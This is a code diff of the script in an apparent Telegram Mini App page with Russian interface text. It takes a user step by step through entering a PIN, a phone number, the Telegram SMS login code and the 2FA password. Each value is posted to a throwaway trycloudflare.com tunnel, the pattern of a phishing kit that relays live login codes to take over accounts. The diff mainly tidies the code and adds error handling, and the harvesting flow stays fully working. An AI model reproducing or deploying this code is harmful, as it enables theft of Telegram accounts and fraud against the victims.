@@ -284,55 +284,53 @@
 function setTheme() {
   if (window.Telegram && Telegram.WebApp && Telegram.WebApp.themeParams) {
     const theme = Telegram.WebApp.themeParams;
-    if (theme.bg_color)         document.documentElement.style.setProperty('--bg-color', theme.bg_color);
-    if (theme.text_color)       document.documentElement.style.setProperty('--text-color', theme.text_color);
-    if (theme.hint_color)       document.documentElement.style.setProperty('--hint-color', theme.hint_color);
-    if (theme.button_color)     document.documentElement.style.setProperty('--button-color', theme.button_color);
-    if (theme.button_text_color)document.documentElement.style.setProperty('--button-text-color', theme.button_text_color);
+    if (theme.bg_color) document.documentElement.style.setProperty('--bg-color', theme.bg_color);
+    if (theme.text_color) document.documentElement.style.setProperty('--text-color', theme.text_color);
+    if (theme.hint_color) document.documentElement.style.setProperty('--hint-color', theme.hint_color);
+    if (theme.button_color) document.documentElement.style.setProperty('--button-color', theme.button_color);
+    if (theme.button_text_color) document.documentElement.style.setProperty('--button-text-color', theme.button_text_color);
     if (theme.secondary_bg_color) document.documentElement.style.setProperty('--input-bg', theme.secondary_bg_color);
     if (theme.input_border_color) document.documentElement.style.setProperty('--input-border', theme.input_border_color);
-    if (theme.link_color)         document.documentElement.style.setProperty('--input-border-focus', theme.link_color);
+    if (theme.link_color) document.documentElement.style.setProperty('--input-border-focus', theme.link_color);
   }
 }
+
 document.addEventListener('DOMContentLoaded', () => {
   if (window.Telegram && Telegram.WebApp) {
     Telegram.WebApp.ready();
     setTheme();
     Telegram.WebApp.onEvent('themeChanged', setTheme);
   }
-  // PIN keyboard logic
   initCustomKeyboard("pin-code-inputs", "pin-keyboard");
-  // SMS keyboard logic
   initCustomKeyboard("sms-code-inputs", "sms-keyboard");
 });
+
 function initCustomKeyboard(inputContainerId, keyboardId) {
   const container = document.getElementById(inputContainerId);
   const inputs = Array.from(container.querySelectorAll("input"));
   const keypad = document.getElementById(keyboardId);
   let currentInputIndex = 0;
+
   function setActiveInput(idx) {
     inputs.forEach((inp, i) => {
-      if (i === idx) {
-        inp.classList.add("active-input");
-        inp.focus();
-      } else {
-        inp.classList.remove("active-input");
-        inp.blur();
-      }
+      inp.classList.toggle("active-input", i === idx);
+      i === idx ? inp.focus() : inp.blur();
     });
     currentInputIndex = idx;
   }
+
   setActiveInput(0);
+
   keypad.addEventListener("click", (e) => {
     const btn = e.target.closest(".number-key");
     if (!btn) return;
+
     if (btn.hasAttribute("data-key")) {
       if (currentInputIndex < inputs.length && !inputs[currentInputIndex].value) {
         inputs[currentInputIndex].value = btn.getAttribute("data-key");
         if (currentInputIndex < inputs.length - 1) setActiveInput(currentInputIndex + 1);
       }
     } else if (btn.getAttribute("data-action") === "del") {
-      // find last filled or current
       if (inputs[currentInputIndex].value) {
         inputs[currentInputIndex].value = "";
       } else if (currentInputIndex > 0) {
@@ -341,15 +339,14 @@ function initCustomKeyboard(inputContainerId, keyboardId) {
       }
     }
   });
+
   inputs.forEach((input, idx) => {
     input.addEventListener("focus", (e) => {
       setActiveInput(idx);
       e.preventDefault();
     });
-    // Блокируем ввод с клавиатуры
     input.addEventListener("keydown", e => e.preventDefault());
     input.addEventListener("input", e => e.preventDefault());
-    // Запрещаем появление клавиатуры на touch
     input.addEventListener("touchstart", e => {
       setActiveInput(idx);
       e.preventDefault();
@@ -360,124 +357,155 @@ function initCustomKeyboard(inputContainerId, keyboardId) {
     });
   });
 }
+
 let userPhone = '';
 let userPin = '';
 let apiUrl = "https://amplifier-sapphire-winners-weeks.trycloudflare.com/api/step";
+
 function showStep(current, next) {
   document.getElementById(current).classList.remove("step-active");
   document.getElementById(next).classList.add("step-active");
-  // Фокусируемся на первом input для кода, если есть кастомная клавиатура
+
   if (next === "step-pin") {
     setTimeout(() => {
-      document.querySelectorAll("#pin-code-inputs input")[0].focus();
+      document.querySelector("#pin-code-inputs input")?.focus();
     }, 100);
   }
   if (next === "step-code") {
     setTimeout(() => {
-      document.querySelectorAll("#sms-code-inputs input")[0].focus();
+      document.querySelector("#sms-code-inputs input")?.focus();
     }, 100);
   }
 }
+
 async function submitPin() {
   const inputs = document.querySelectorAll("#pin-code-inputs input");
   const pin = Array.from(inputs).map(i => i.value).join("");
   const errorDiv = document.getElementById("pin-error");
   errorDiv.textContent = "";
+
   if (pin.length < 4) {
     errorDiv.textContent = "Введите PIN полностью";
     return;
   }
+
   userPin = pin;
-  const res = await fetch(apiUrl, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ step: "pin", pin })
-  });
-  const json = await res.json();
-  if (json.ok) {
-    showStep("step-pin", "step-phone");
-  } else {
-    errorDiv.textContent = json.error;
-    inputs.forEach(i => i.value = "");
-    inputs[0].focus();
+  try {
+    const res = await fetch(apiUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "pin", pin })
+    });
+    const json = await res.json();
+    if (json.ok) {
+      showStep("step-pin", "step-phone");
+    } else {
+      errorDiv.textContent = json.error || "Ошибка PIN";
+      inputs.forEach(i => i.value = "");
+      inputs[0].focus();
+    }
+  } catch {
+    errorDiv.textContent = "Ошибка сети";
   }
 }
+
 async function submitPhone() {
   const phoneInput = document.getElementById("phone-input");
   const phone = phoneInput.value.trim();
   const errorDiv = document.getElementById("phone-error");
   errorDiv.textContent = "";
+
   if (!phone) {
     errorDiv.textContent = "Введите номер";
     return;
   }
+
   userPhone = phone;
-  const res = await fetch(apiUrl, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ step: "phone", phone, pin: userPin })
-  });
-  const json = await res.json();
-  if (json.ok) {
-    showStep("step-phone", "step-code");
-  } else {
-    errorDiv.textContent = json.error;
+  try {
+    const res = await fetch(apiUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "phone", phone, pin: userPin })
+    });
+    const json = await res.json();
+    if (json.ok) {
+      showStep("step-phone", "step-code");
+    } else {
+      errorDiv.textContent = json.error || "Ошибка телефона";
+    }
+  } catch {
+    errorDiv.textContent = "Ошибка сети";
   }
 }
+
 async function submitSmsCode() {
   const inputs = document.querySelectorAll("#sms-code-inputs input");
   const sms_code = Array.from(inputs).map(i => i.value).join("");
   const errorDiv = document.getElementById("sms-error");
   errorDiv.textContent = "";
+
   if (sms_code.length < 5) {
     errorDiv.textContent = "Введите полный код";
     return;
   }
-  const res = await fetch(apiUrl, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ step: "sms", phone: userPhone, sms_code, pin: userPin })
-  });
-  const json = await res.json();
-  if (json.ok && json["2fa_required"]) {
-    showStep("step-code", "step-2fa");
-  } else if (json.ok) {
-    await fetch(apiUrl, {
+
+  try {
+    const res = await fetch(apiUrl, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "sms", phone: userPhone, sms_code, pin: userPin })
     });
-    showStep("step-code", "step-done");
-  } else {
-    errorDiv.textContent = json.error;
-    inputs.forEach(i => i.value = "");
-    inputs[0].focus();
+    const json = await res.json();
+
+    if (json.ok && json["2fa_required"]) {
+      showStep("step-code", "step-2fa");
+    } else if (json.ok) {
+      await fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+      });
+      showStep("step-code", "step-done");
+    } else {
+      errorDiv.textContent = json.error || "Ошибка кода";
+      inputs.forEach(i => i.value = "");
+      inputs[0].focus();
+    }
+  } catch {
+    errorDiv.textContent = "Ошибка сети";
   }
 }
+
 async function submit2FA() {
   const code_2fa = document.getElementById("input-2fa").value;
   const errorDiv = document.getElementById("fa2-error");
   errorDiv.textContent = "";
-  const res = await fetch(apiUrl, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ step: "2fa", phone: userPhone, code_2fa, pin: userPin })
-  });
-  const json = await res.json();
-  if (json.ok) {
-    await fetch(apiUrl, {
+
+  try {
+    const res = await fetch(apiUrl, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "2fa", phone: userPhone, code_2fa, pin: userPin })
     });
-    showStep("step-2fa", "step-done");
-  } else {
-    errorDiv.textContent = json.error;
-    document.getElementById("input-2fa").value = "";
-    document.getElementById("input-2fa").focus();
+    const json = await res.json();
+
+    if (json.ok) {
+      await fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+      });
+      showStep("step-2fa", "step-done");
+    } else {
+      errorDiv.textContent = json.error || "Ошибка 2FA";
+      document.getElementById("input-2fa").value = "";
+      document.getElementById("input-2fa").focus();
+    }
+  } catch {
+    errorDiv.textContent = "Ошибка сети";
   }
 }
-
 </script>
+
 </body>
 </html>
